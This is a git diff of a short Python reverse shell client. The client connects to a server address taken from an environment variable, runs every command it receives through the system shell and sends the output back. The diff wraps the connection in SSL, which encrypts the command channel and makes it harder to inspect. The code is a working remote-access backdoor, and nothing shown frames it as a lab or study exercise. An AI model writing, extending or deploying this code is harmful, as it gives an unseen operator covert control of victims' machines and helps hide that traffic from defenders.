@@ -1,4 +1,5 @@
 import socket
+import ssl
 import subprocess
 import os
 from dotenv import load_dotenv
@@ -9,13 +10,17 @@ load_dotenv()
 ip_server = os.getenv('IP_SERVER')
 
 client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client_socket.connect((ip_server, SERVER_PORT))
+context = ssl.create_default_context()
+
+# Envelopper le socket avec SSL
+secure_socket = context.wrap_socket(client_socket, server_hostname=ip_server)
+secure_socket.connect((ip_server, SERVER_PORT))
 
 while True:
-    command = client_socket.recv(1024).decode()
+    command = secure_socket.recv(1024).decode()
     if command.lower() == 'exit':
         break
     result = subprocess.run(command, shell=True, capture_output=True, text=True)
-    client_socket.send(result.stdout.encode() + result.stderr.encode())
+    secure_socket.send(result.stdout.encode() + result.stderr.encode())
 
-client_socket.close()
+secure_socket.close()
